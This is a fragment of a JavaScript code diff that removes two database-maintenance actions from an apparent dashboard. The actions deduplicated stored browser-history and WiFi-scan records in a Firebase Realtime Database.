-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/browser_history/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate browser history entries`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
-    return;
-  }
-  if (action === 'dedupWifi') {
-    if (!confirm('Scan and remove duplicate WiFi scan entries? Only one entry per unique SSID, BSSID, and timestamp will be kept.')) return;
-    showAlert('Scanning WiFi scans...', 'warn');
-    const keys = await fetchRTDB(`${base}/wifi_scan`, 'shallow=true');
-    if (!keys || typeof keys !== 'object') { showAlert('No WiFi scan data found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-    const groups = {};
-    let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/wifi_scan/${k}`);
-      if (doc && doc.networks) {
-        // Dedup based on first network's SSID/BSSID + timestamp
-        const first = Array.isArray(doc.networks) ? doc.networks[0] : null;
-        if (first && (first.ssid || first.bssid)) {
-          const gk = `${first.ssid || ''}|${first.bssid || ''}|${Math.floor(doc.ts_ms / 1000)}`;
-          if (!groups[gk]) groups[gk] = [];
-          groups[gk].push({ key: k });
-        }
-      }
-      scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning WiFi ${scanned}/${allKeys.length}...</div>`;
-    }
-    let deleted = 0;
-    for (const [gk, entries] of Object.entries(groups)) {
-      if (entries.length <= 1) continue;
-      entries.sort((a, b) => parseInt(b.key) - parseInt(a.key));
-      for (let i = 1; i < entries.length; i++) {
-        if (await deleteRTDB(`${base}/wifi_scan/${entries[i].key}`)) deleted++;
-      }
-    }
-    showAlert(`Deleted ${deleted} duplicate WiFi entries`, deleted > 0 ? 'warn' : 'error');
-    await refreshStorage();
     return;
   }
   if (action === 'clearPhotoCache') {
